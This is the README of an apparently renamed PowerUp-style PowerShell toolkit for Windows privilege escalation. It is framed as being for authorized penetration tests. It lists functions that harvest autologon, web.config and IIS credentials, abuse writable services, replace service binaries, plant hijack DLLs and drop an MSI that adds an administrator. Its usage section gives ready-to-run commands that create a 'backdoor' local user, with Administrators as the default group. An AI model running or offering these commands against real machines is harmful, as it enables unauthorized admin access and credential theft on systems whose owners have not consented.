# WinPrivCheck

Windows privilege escalation enumeration and exploitation script for authorized penetration testing engagements.

---

## Requirements

- PowerShell 3.0+
- No external dependencies

## Load

```powershell
. .\PowerUp-OPSEC.ps1
```

---

## Functions

### Enumeration

| Function | Description |
|---|---|
| `Get-SvcUnq` | Enumerate services with unquoted paths and spaces |
| `Get-SvcFP` | Enumerate services with modifiable binary/argument paths |
| `Get-SvcPerm` | Enumerate services the current user can modify via DACL |
| `Get-SvcDet` | Return detailed info for a named service |
| `Find-DLLHij` | Find loaded DLLs that could be replaced in writable directories |
| `Find-PathHij` | Find `%PATH%` directories the current user can write to |
| `Get-RegAIE` | Check `AlwaysInstallElevated` registry keys |
| `Get-RegAL` | Extract autologon credentials from the registry |
| `Get-VulnAR` | Enumerate writable registry autorun paths |
| `Get-VulnST` | Enumerate scheduled tasks with modifiable file paths |
| `Get-UIF` | Search for unattended install files (`unattend.xml`, `sysprep.xml`, etc.) |
| `Get-WCfg` | Extract encrypted connection strings from `web.config` files |
| `Get-AppH` | Extract encrypted IIS application pool and virtual directory passwords |
| `Invoke-Chk` | Run all checks above and print results; optionally write an HTML report |

### Exploitation

| Function | Description |
|---|---|
| `Invoke-SvcAbuse` | Abuse a modifiable service to execute a command or add a local user |
| `Write-SvcBin` | Write a patched service binary (`.exe`) to a target path |
| `Install-SvcBin` | Backup the current service binary and drop a patched one in its place |
| `Restore-SvcBin` | Restore a service binary from its `.bak` backup |
| `Write-HijDll` | Write a 32-bit or 64-bit hijack DLL with a bat-launcher payload |
| `Write-UAMSI` | Drop a prebuilt MSI that adds a local admin user when run as SYSTEM |

### Helpers (internal use)

| Function | Description |
|---|---|
| `Get-MFile` | Return any writable file path found within a given string |
| `Test-SvcDP` | Test whether the current user has specific DACL rights on a service |
| `Start-SvcI` | Start a named service |
| `Stop-SvcI` | Stop a named service |
| `Enable-SvcI` | Set a service start type to `demand` |
| `Disable-SvcI` | Set a service start type to `disabled` |

---

## Usage

### Run all checks

```powershell
Invoke-Chk
```

```powershell
# Save results to an HTML report
Invoke-Chk -HTMLReport
```

### Service abuse

```powershell
# Add a local user via a vulnerable service
Invoke-SvcAbuse -ServiceName VulnSvc

# Custom username / password / group
Invoke-SvcAbuse -ServiceName VulnSvc -UserName ops -Password 'P@ss1' -LocalGroup Users

# Run an arbitrary command instead
Invoke-SvcAbuse -ServiceName VulnSvc -Command "net user backdoor P@ss1 /add"
```

### Replace a service binary

```powershell
# Drop a patched binary; adds default local user on service start
Install-SvcBin -ServiceName VulnSvc

# Restore original binary from backup
Restore-SvcBin -ServiceName VulnSvc
```

### DLL / PATH hijacking

```powershell
# Find hijackable DLL locations
Find-DLLHij

# Find writable %PATH% directories
Find-PathHij

# Write a DLL payload (x86 or x64 auto-detected)
Write-HijDll -OutputFile C:\Temp\version.dll -Command "net user backdoor P@ss1 /add"
```

### Registry / credential checks

```powershell
Get-RegAIE    # AlwaysInstallElevated
Get-RegAL     # Autologon credentials
Get-VulnAR    # Writable autorun paths
Get-UIF       # Unattended install files
Get-WCfg      # web.config encrypted strings
Get-AppH      # IIS app pool passwords
```

---

## Default parameters

| Parameter | Default |
|---|---|
| `-UserName` | `svcact` |
| `-Password` | `Str0ng@98!` |
| `-LocalGroup` | `Administrators` |

Override any of these on the command line.

---

## Notes

- All checks are read-only unless an exploitation function is called explicitly.
- `Invoke-SvcAbuse` modifies the service `binPath`, runs the command, then restores the original path.
- `Install-SvcBin` creates a `.bak` of the original binary before overwriting; restore with `Restore-SvcBin`.
- `Write-HijDll` drops a `.bat` launcher alongside the DLL; both files must be cleaned up manually after the engagement.
- `Write-UAMSI` requires the MSI to be executed with elevated privileges (e.g. via `AlwaysInstallElevated`).
